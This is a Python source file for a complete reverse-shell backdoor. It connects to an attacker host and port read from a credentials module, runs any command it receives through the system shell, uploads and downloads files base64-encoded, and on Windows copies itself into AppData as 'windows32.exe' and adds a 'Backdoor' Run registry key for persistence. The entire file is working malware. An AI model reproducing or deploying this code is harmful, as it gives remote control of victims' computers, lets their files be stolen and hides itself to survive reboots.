#! /usr/bin/python

import sys
import os
import socket
import json
import subprocess
import base64
import shutil

from ip_cred import IP, PORT


def reliable_send(data):
	json_data = json.dumps(data)
	sock.send(json_data.encode("utf-8"))


def reliable_recv():
	data = ""
	while True:
		try:
			data = data + sock.recv(1024).decode("utf-8")
			return json.loads(data)
		except ValueError:
			continue


def shell():
	while True:
		command = reliable_recv()
		if command == "q":
			break
		elif command[:2] == "cd" and len(command) > 1:
			try:
				os.chdir(command[3:])
			except:
				continue
		elif command[0:8] == "download": # Downloads file from client's pc to server
			try:
				with open(command[9:], "rb") as download_file:
					reliable_send(base64.b64encode(download_file.read()).decode("utf-8"))
			except Exception as e:
				reliable_send(str(e))
		elif command[:6] == "upload": # Uploads file to client's pc from server
			try:
				data = reliable_recv()
				file_content = base64.b64decode(data)
				with open(command[7:], "wb") as upload_file:
					upload_file.write(file_content)
			except:
				continue
		else:
			proc  = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			result = proc.stdout.read() + proc.stderr.read() # executes received command
			reliable_send(result.decode("utf-8"))
			#message = "Hello World"
			#sock.send(message.encode("utf-8"))

try:
	# for windows pc
	location = os.environ["appdata"] + "\\windows32.exe"
	if not os.path.exists(location):
		shutil.copyfile(sys.executable, location)
		# Create persistance
		subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "' + location + '"', shell=True)
except:
	pass

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sock.connect((IP, PORT))

shell()

sock.close()

